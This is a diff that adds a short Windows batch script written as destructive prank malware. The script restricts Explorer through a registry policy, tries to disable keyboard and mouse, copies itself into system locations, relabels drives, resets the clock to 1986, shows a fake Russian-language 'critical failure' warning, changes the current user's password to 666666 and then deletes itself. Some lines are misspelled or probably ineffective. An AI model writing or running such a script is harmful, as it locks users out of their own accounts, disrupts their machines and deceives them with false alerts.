@@ -1,0 +1,15 @@
+@echo off
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f >nul
+rundll32 keyboard,disable >nul
+rundll32 mouse,disable >nul
+copy %0 %windir%/system
+copy %0 C:\System.bat
+laber O:Disc 666
+label C:Disc 666
+time 0:00
+date 10.10.1986
+chcp 1251
+msg * В каталоге C://Users/Windows/system32 обнаружена критическая неисправность
+md 666
+net user %username% 666666
+del "%0" >nul
